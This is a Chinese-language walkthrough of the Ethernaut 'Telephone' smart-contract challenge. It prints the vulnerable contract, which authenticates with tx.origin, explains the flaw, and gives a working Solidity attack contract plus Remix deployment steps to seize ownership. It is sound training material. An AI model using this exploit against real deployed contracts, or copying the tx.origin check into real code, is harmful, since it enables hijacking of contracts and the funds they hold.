# Ethernaut做题笔记(第五题)

## 1.题目要求

获得下面合约来完成这一关

 这可能有用

- 参阅帮助页面,在 ["Beyond the console"](https://ethernaut.openzeppelin.com/help) 部分



## 2.题目代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```



## 3.合约分析

前面是个构造函数，把owner赋给了合约的创建者，照例看了一下这是不是真的构造函数，确定没有问题，下面一个changeOwner函数则检查tx.origin和msg.sender是否相等，如果不一样就把owner更新为传入的owner。

这里涉及到了tx.origin和msg.sender的区别，前者表示交易的发送者，后者则表示消息的发送者，如果情景是在一个合约下的调用，那么这两者是木有区别的，但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户，知道了这些那么就很简单了，和上一个题目一样，我们这里需要另外部署一个合约来调用这儿的changeOwner



## 4.攻击合约

```solidity
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
contract exploit {

    Telephone target = Telephone(your instance address);

    function hack(){
        target.changeOwner(msg.sender);
    }
}
```



## 5.攻击流程

获取一个新实例，输入``await contract.address``查看合约地址

![iOlYiA.png](https://i.328888.xyz/2023/04/03/iOlYiA.png)



再将上述获取到的地址替换Telephone_test.sol中的地址

![iOwdgd.png](https://i.328888.xyz/2023/04/03/iOwdgd.png)



在remix中编译并部署该合约

deploy时，ENVIRONMENT需要选择Injected Provider-MetaMask,CONTRACT需要选择第二个exploit

如果选择第一个合约，那么在后面攻击时，就没有hack函数（这里第一次做的时候做错了）

![iOwKFk.png](https://i.328888.xyz/2023/04/03/iOwKFk.png)

![iOwLQL.png](https://i.328888.xyz/2023/04/03/iOwLQL.png)



再输入命令查看合约的owner地址：``await contract.owner()``

![iOwaLv.png](https://i.328888.xyz/2023/04/03/iOwaLv.png)



之后在remix里点击hack来实施攻击

![iOwQn3.png](https://i.328888.xyz/2023/04/03/iOwQn3.png)



之后再次输入命令查看，发现成变换合约的owner，并提交该实例：``await contract.owner()``

![iO2lGA.png](https://i.328888.xyz/2023/04/03/iO2lGA.png)
